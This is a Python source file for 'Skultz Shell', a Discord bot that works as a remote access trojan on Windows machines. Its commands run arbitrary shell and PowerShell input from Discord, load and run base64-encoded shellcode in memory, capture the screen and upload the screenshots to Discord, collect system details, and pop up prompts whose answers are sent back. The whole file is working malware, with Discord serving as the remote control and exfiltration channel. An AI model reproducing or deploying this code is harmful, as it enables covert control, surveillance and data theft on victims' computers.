import pprint
import time
from Shell_Engine import *
import base64
import ctypes
import getpass
import re
import subprocess
import urllib.request
import sys
import string
import random
from discord import message
import logging
import GPUtil
from tabulate import tabulate
import cv2
import discord
from discord.ext import commands
from discord import client
import os
import socket
import platform
import shutil
import pyautogui
import win32gui
import json
import base64
import sqlite3
import win32crypt
from datetime import timezone, datetime, timedelta
import psutil
from subprocess import Popen, PIPE
from datetime import datetime
from threading import Thread
import time
from sys import argv
import win32process

bot = discord.Client()

token = ''



logger = logging.getLogger('discord')
logger.setLevel(logging.DEBUG)
handler = logging.FileHandler(filename='discord.log', encoding='utf-8', mode='w')
handler.setFormatter(logging.Formatter('%(asctime)s:%(levelname)s:%(name)s: %(message)s'))
logger.addHandler(handler)



description = '''yes'''

intents = discord.Intents.default()
intents.members = True

def get_size(bytes, suffix="B"):
    factor = 1024
    for unit in ["", "K", "M", "G", "T", "P"]:
        if bytes < factor:
            return f"{bytes:.2f}{unit}{suffix}"
        bytes /= factor

bot = commands.Bot(command_prefix='!', description=description, intents=intents)


@bot.event
async def on_ready():
    print("-----------------------------------------------")
    print("[!] Iniciando seccion como: ", bot.user.name)
    print("[!] ID: ", bot.user.id)
    print("-----------------------------------------------")


@bot.command()
async def cmd(ctx, input: str):
    """executes commands on the pc"""
    comando = input
    b = subprocess.check_output(comando, shell=True)
    output = b.decode('cp1252')
    #if comando == "nslookup myip.opendns.com. resolver1.opendns.com":
        #await ctx.send("no")
    #await ctx.send(output)
    embed = discord.Embed(title='Console', description = '[!]: '+output, color = 0x680a0a)
    embed.set_author(name='Skultz Shell', icon_url='https://cdn.discordapp.com/avatars/938965587110014996/e54cc8194cd33f576549fd75923fc642.png?size=1024')
    embed.set_footer(text="Command executed by: {}".format(ctx.author.display_name))
    await ctx.send(embed=embed)

@bot.command()
async def c(ctx):
    """custom help message"""
    await ctx.send(help_message)


@bot.command()
async def sysm(ctx):
    """returns system information"""
    sysinfo = get_system_info()
    #await ctx.send(sysinfo)
    embed = discord.Embed(title='System information', description = '[!]: '+sysinfo, color = 0x680a0a)
    embed.set_author(name='Skultz Shell', icon_url='https://cdn.discordapp.com/avatars/938965587110014996/e54cc8194cd33f576549fd75923fc642.png?size=1024')
    embed.set_footer(text="Command executed by: {}".format(ctx.author.display_name))
    await ctx.send(embed=embed)

@bot.command()
async def shell(ctx, msg: str):
    """"""
    if "Windows" not in platform.system():
        return "[!] Currently this functionality is only available for Windows platforms."
    else:
        # based on Debasish Mandal's "Execute ShellCode Using Python"
        # http://www.debasish.in/2012/04/execute-shellcode-using-python.html
        shellcode = bytearray(base64.b64decode(msg))

        ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
                                                  ctypes.c_int(len(shellcode)),
                                                  ctypes.c_int(0x3000),
                                                  ctypes.c_int(0x40))

        buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)

        ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),
                                             buf,
                                             ctypes.c_int(len(shellcode)))

        ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
                                                 ctypes.c_int(0),
                                                 ctypes.c_int(ptr),
                                                 ctypes.c_int(0),
                                                 ctypes.c_int(0),
                                                 ctypes.pointer(ctypes.c_int(0)))

        ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),
                                                   ctypes.c_int(-1))

        return "[*] Shellcode (%d bytes) executed in memory." % len(shellcode)

pc_name = os.getenv("UserName")

@bot.command()
async def screenshot(ctx, pc=pc_name):
    if pc == os.getenv("UserName"):
        pyautogui.screenshot(f'C:\\Users\\{os.getenv("username")}\\s.png')
        await ctx.send(file=discord.File(f'C:\\Users\\{os.getenv("username")}\\s.png'))
        os.remove(f'C:\\Users\\{os.getenv("username")}\\s.png')

@bot.command()
async def battery(ctx, pc=pc_name):
    if pc == os.getenv("UserName"):
        battery = psutil.sensors_battery()
        await ctx.send(f"Battery percentage : {battery.percent}\nPower plugged in : {battery.power_plugged}")

def normal_info():
    uname = platform.uname()
    boot_time_timestamp = psutil.boot_time()
    bt = datetime.fromtimestamp(boot_time_timestamp)
    return f"""
Computer Name: {os.getenv('username')}
System: {uname.system}
Node Name: {uname.node}
Release: {uname.release}
Version: {uname.version}
Machine: {uname.machine}
Processor: {uname.processor}
Boot Time: {bt.year}/{bt.month}/{bt.day} {bt.hour}:{bt.minute}:{bt.second}\n"""

@bot.command()
async def info(ctx, pc=pc_name):
    await ctx.send(f"```yaml\n{normal_info()}\n```")

@bot.command()
async def textbox(ctx, pc=pc_name, *, args):
    if pc == os.getenv("UserName"):
        cose = args.split(';')
        x = pyautogui.prompt(text=cose[1], title=cose[0] , default='')
        await ctx.send(f'response: `{x}`')

@bot.command()
async def cmd2(ctx, pc=pc_name, *, args):
    if pc == os.getenv("UserName"):
        os.system(f"powershell -c \"{args}\"")
        comando = args
        b  = subprocess.check_output(comando, shell=True)
        output = b.decode('cp1252')
        await ctx.send(output)

bot.run(token)